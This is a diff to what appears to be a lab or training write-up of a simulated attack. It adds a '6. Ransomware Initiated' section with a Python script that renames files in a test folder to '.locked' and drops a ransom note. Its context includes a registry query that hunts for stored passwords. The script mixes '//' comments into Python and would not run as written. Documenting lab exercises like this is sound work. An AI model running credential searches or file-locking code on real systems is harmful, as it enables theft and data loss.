@@ -353,4 +353,20 @@ reg query HKLM /f password /t REG_SZ /s #searches top-level registry hive for en
 
 <img width="3840" height="2160" alt="before and after images (after is on right)" src="https://github.com/user-attachments/assets/f630bdae-3318-4be9-b003-ec4b92695e5b" />
 
+### 6. Ransomware Initiated
 
+(to lock the files for the later phase)
+import os
+
+// Directory to 'lock' files in (choose a harmless test folder!)
+target_dir = "C:/Users/YourUser/Desktop/testfolder"
+
+for filename in os.listdir(target_dir):
+    file_path = os.path.join(target_dir, filename)
+    if os.path.isfile(file_path):
+        # Simulate locking by renaming the file
+        os.rename(file_path, file_path + ".locked")
+
+// Create a ransom note
+with open(os.path.join(target_dir, "README_RESTORE_FILES.txt"), "w") as f:
+    f.write("Your files have been 'locked'. This is a simulation for educational purposes.\nNo data has been harmed.\n")
